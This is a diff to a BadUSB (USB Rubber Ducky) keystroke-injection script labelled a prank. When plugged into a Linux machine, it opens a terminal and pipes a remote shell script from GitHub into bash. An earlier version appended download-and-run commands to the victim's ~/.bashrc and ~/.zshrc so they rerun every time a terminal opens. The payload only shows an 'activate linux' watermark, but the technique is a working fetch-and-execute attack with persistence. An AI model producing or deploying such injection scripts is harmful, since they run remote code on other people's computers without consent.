@@ -1,10 +1,10 @@
 REM Title: Activate Linux
 REM Author: FalsePhilosopher
-REM Target:  Unix-like tested on kubuntu 22.04
-REM Props: Hak5, the community and memes
+REM Target:  Unix-like
+REM Props: All the memes and MrGlockenspiel https://github.com/MrGlockenspiel/activate-linux
 REM Version: 1.0
 REM Category: Prank
-REM Launches terminal, downloads appimage and launches it.
+REM Launches terminal to filelessly execute a script to download the activate linux appimage and echos to bashrc/zshrc to launch activate linux open a shell.
 REM
 REM initialization delay
 DELAY 300
@@ -12,9 +12,5 @@ REM Minimize all windows as that ensures launch happens smoother.
 WINDOWS d
 DELAY 300
 CTRL-ALT t
-DELAY 1500
-STRING nohup wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Activate_linux/AL.AppImage && chmod +x AL.AppImage && ./AL.AppImage & disown && exit
-ENTER
-REM If you want this to pop up every time they open a terminal
-REM STRING echo "wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Activate_linux/AL.AppImage && chmod +x AL.AppImage && ./AL.AppImage & disown" >> ~/.zshrc && echo "wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Activate_linux/AL.AppImage && chmod +x AL.AppImage && ./AL.AppImage & disown" >> ~/.bashrc && exit
-REM ENTER
+DELAY 2000
+STRINGLN wget -qO - https://github.com/FalsePhilosopher/BadUSB-Playground/raw/refs/heads/main/Ducky/USBRubberducky/prank/Unix-like/Linux/Activate_linux/al.sh | bash
